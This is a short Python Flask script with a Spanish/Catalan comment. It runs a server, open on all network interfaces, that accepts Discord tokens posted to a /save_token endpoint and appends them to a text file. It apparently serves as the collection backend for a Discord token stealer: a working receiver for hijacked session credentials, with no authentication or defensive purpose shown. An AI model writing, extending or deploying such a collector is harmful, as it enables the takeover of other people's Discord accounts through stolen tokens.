from flask import Flask, request

app = Flask(__name__)

@app.route('/save_token', methods=['POST'])
def save_token():
    token = request.form.get('token')
    if token:
        with open('tokens_discord.txt', 'a') as f:
            f.write(token + '\n')
        return 'Token saved', 200
    return 'No token provided', 400

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)  # Asegura que l'aplicació escolti en totes les adreces IP
